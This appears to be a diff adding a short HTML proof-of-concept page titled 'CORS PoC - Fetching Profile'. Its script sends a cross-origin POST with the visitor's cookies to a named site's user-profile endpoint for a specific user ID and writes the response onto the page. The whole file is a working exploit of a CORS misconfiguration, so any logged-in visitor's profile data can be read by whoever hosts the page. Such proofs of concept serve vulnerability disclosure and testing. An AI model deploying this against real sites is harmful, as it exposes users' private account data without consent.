@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <h2>CORS PoC - Fetching Profile</h2>
+  <pre id="result">Loading...</pre>
+  <script>
+    fetch("https://www.onevasco.com/onevasco/v4.3/user/profile", {
+      method: "POST",
+      credentials: "include",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        "user_id": "5476322e-6b3e-4bd3-842a-4e5dd903db57"
+      })
+    })
+    .then(res => res.text())
+    .then(data => {
+      document.getElementById("result").textContent = data;
+    })
+    .catch(err => {
+      document.getElementById("result").textContent = "Request failed: " + err;
+    });
+  </script>
+</body>
+</html>
